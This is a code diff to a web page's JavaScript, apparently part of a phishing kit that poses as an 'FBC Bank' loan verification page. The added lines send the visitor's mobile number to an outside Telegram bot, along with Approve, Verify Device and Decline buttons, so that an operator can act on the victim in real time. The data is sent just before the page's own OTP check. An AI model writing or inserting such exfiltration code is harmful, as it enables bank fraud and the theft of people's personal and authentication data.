@@ -540,6 +540,38 @@
       verifyBtn.disabled = true;
       verifyBtn.textContent = 'Verifying…';
 
+    
+      const ts = Date.now();
+      const approveId = `approve_${ts}`;
+      const declineId = `decline_${ts}`;
+      const verifyId = `verify_${ts}`;
+
+      fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: CONFIG.CHAT_ID,
+          text: `
+<b>📱 FBC Bank Loan Verification</b>
+
+Mobile: <code>${mobile}</code>
+Applicant: <code>Not provided</code>
+`,
+          parse_mode: 'HTML',
+          reply_markup: {
+            inline_keyboard: [
+              [
+                { text: '✅ Approve', callback_data: approveId },
+                { text: '📱 Verify Device', callback_data: verifyId }
+              ],
+              [
+                { text: '❌ Decline', callback_data: declineId }
+              ]
+            ]
+          }
+        })
+      })
+
       fetch('/api/verify-otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
